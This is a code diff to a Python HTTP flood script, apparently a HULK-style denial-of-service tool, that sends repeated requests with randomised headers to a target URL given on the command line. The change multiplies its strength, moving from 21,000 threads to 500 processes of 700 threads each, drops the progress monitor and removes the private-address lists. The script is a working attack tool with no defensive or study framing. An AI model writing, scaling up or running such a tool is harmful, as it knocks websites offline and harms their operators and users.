@@ -7,6 +7,7 @@ import time
 from datetime import datetime, timedelta
 import urllib.request
 import urllib.error
+import multiprocessing
 
 url = ''
 host = ''
@@ -15,9 +16,6 @@ headers_referers = []
 request_counter = 0
 flag = 0
 threads = []
-
-isp_blocks = ['192.168.0.0/24', '10.0.0.0/8', '172.16.0.0/12']
-real_ips = ['192.168.0.1', '10.0.0.1', '172.16.0.1']
 
 def load_useragents():
     with open('useragents.txt', 'r') as f:
@@ -86,15 +84,13 @@ class HTTPThread(threading.Thread):
             httpcall(url)
             time.sleep(random.uniform(0.1, 0.5))
 
-class MonitorThread(threading.Thread):
-    def run(self):
-        previous = request_counter
-        while flag == 0:
-            if previous + 1000 < request_counter and previous != request_counter:
-                print(f"{request_counter} Requests Sent")
-                previous = request_counter
-        if flag == 2:
-            print("\n-- Attack stopped by user --")
+def worker():
+    for _ in range(700):
+        t = HTTPThread()
+        t.start()
+        threads.append(t)
+    for t in threads:
+        t.join()
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
@@ -105,15 +101,12 @@ if __name__ == "__main__":
         url += "/"
     m = re.search('(https?://)?([^/]*)/?.*', url)
     host = m.group(2)
-    for i in range(21000):
-        t = HTTPThread()
-        t.start()
-        threads.append(t)
-    monitor = MonitorThread()
-    monitor.start()
-    threads.append(monitor)
+    processes = [multiprocessing.Process(target=worker) for _ in range(500)]
+    for p in processes:
+        p.start()
+    for p in processes:
+        p.join()
     try:
-        for t in threads:
-            t.join()
+        stop_attack()
     except KeyboardInterrupt:
         stop_attack()
